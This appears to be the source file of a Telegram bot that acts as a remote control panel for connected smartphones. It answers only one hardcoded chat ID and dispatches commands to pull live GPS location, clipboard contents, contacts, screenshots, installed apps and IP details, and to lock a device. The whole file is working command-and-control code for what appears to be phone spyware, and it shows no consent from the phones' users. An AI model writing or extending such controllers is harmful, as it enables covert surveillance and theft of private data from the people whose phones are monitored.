require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const User = require('./models/User');
const { pendingCommands } = require('./queue');

const token = process.env.TELEGRAM_BOT_TOKEN;
const PERMANENT_CHAT_ID = '6670344997';

if (!token) {
    console.error("ERROR: TELEGRAM_BOT_TOKEN is missing!");
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: { interval: 2000, autoStart: true, params: { timeout: 10 } } 
});

bot.deleteWebHook().catch(() => {});
bot.on('polling_error', () => {});

console.log('Smart Monitor Telegram Bot is running...');

// 1. /start Command
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  if (chatId.toString() !== PERMANENT_CHAT_ID) return;

  const welcomeMessage = `
🤖 **Smart Monitor & Multi-Device Hub**

Permanent Chat ID linked: \`${PERMANENT_CHAT_ID}\`

**Quick Start:**
- Send /list to view all connected smartphones and open their interactive control panels.
  `;
  bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
});

// 2. /list Command: Show interactive device selection buttons
bot.onText(/\/list/, async (msg) => {
  const chatId = msg.chat.id;
  if (chatId.toString() !== PERMANENT_CHAT_ID) return;

  const devices = await User.find({ chatId: PERMANENT_CHAT_ID });
  if (devices.length === 0) {
    return bot.sendMessage(chatId, '⚠️ No connected smartphones found. Open the app on your devices.');
  }

  const inlineKeyboard = devices.map((d, index) => {
    const cleanId = d.deviceId.replace(/^device_/, '');
    const shortId = cleanId.substring(0, 8);
    return [{ text: `📱 Device ${index + 1} (${shortId}...)`, callback_data: `dev_${d.deviceId}` }];
  });

  bot.sendMessage(chatId, '📱 **Connected Smart Devices:**\nSelect a device below to access its control panel:', {
    reply_markup: { inline_keyboard: inlineKeyboard }
  });
});

// 3. Handle Interactive Button Clicks (Device Selection & Command Dispatch)
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  if (chatId.toString() !== PERMANENT_CHAT_ID) return;

  const data = query.data;

  if (data.startsWith('dev_')) {
    const targetDeviceId = data.replace('dev_', '');
    const cleanId = targetDeviceId.replace(/^device_/, '');
    const shortId = cleanId.substring(0, 8);

    // Command panel for the selected device
    const commandKeyboard = [
      [
        { text: '📊 Device Stats', callback_data: `cmd_device_${targetDeviceId}` },
        { text: '📍 Live GPS', callback_data: `cmd_location_${targetDeviceId}` }
      ],
      [
        { text: '📋 Clipboard', callback_data: `cmd_clipboard_${targetDeviceId}` },
        { text: '📇 Contacts', callback_data: `cmd_contacts_${targetDeviceId}` }
      ],
      [
        { text: '📸 Screenshot', callback_data: `cmd_screenshot_${targetDeviceId}` },
        { text: '📱 Installed Apps', callback_data: `cmd_apps_${targetDeviceId}` }
      ],
      [
        { text: '🌐 Network / IP', callback_data: `cmd_ip_${targetDeviceId}` },
        { text: '🔒 Remote Lock', callback_data: `cmd_lock_${targetDeviceId}` }
      ],
      [
        { text: '« Back to Device List', callback_data: 'back_to_list' }
      ]
    ];

    bot.editMessageText(`📱 **Target Device Selected:** \`${shortId}...\`\nChoose a command to execute:`, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: commandKeyboard }
    });
  } 
  else if (data.startsWith('cmd_')) {
    // Format: cmd_<action>_<deviceId>
    const parts = data.split('_');
    const action = parts[1]; // device, location, clipboard, etc.
    const targetDeviceId = parts.slice(2).join('_'); // rest is deviceId

    pendingCommands[targetDeviceId] = `/${action}`;
    const shortId = targetDeviceId.replace(/^device_/, '').substring(0, 8);

    bot.answerCallbackQuery(query.id, { text: `Command /${action} dispatched!` });
    bot.sendMessage(chatId, `🔍 Executing \`/${action}\` on Device ID: \`${shortId}...\``, { parse_mode: 'Markdown' });
  } 
  else if (data === 'back_to_list') {
    const devices = await User.find({ chatId: PERMANENT_CHAT_ID });
    if (devices.length === 0) {
      return bot.editMessageText('⚠️ No connected smartphones found.', { chat_id: chatId, message_id: query.message.message_id });
    }

    const inlineKeyboard = devices.map((d, index) => {
      const cleanId = d.deviceId.replace(/^device_/, '');
      const shortId = cleanId.substring(0, 8);
      return [{ text: `📱 Device ${index + 1} (${shortId}...)`, callback_data: `dev_${d.deviceId}` }];
    });

    bot.editMessageText('📱 **Connected Smart Devices:**\nSelect a device below to access its control panel:', {
      chat_id: chatId,
      message_id: query.message.message_id,
      reply_markup: { inline_keyboard: inlineKeyboard }
    });
  }
});

module.exports = bot;